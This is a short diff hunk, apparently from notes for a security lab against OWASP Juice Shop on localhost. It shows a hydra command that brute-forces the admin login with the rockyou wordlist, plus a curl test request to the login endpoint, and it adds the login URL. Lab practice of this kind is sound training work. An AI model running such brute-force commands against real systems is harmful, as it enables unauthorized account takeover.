@@ -11,3 +11,6 @@ hydra -s 3000 -vV -l 'admin@juice-sh.op' -P /usr/share/wordlists/rockyou.txt \
 curl -s -X POST http://localhost:3000/rest/user/login \
   -H 'Content-Type: application/json' \
   -d '{"email":"nope@example.com","password":"bad"}' | sed -n '1,200p'
+
+
+http://localhost:3000/#/login
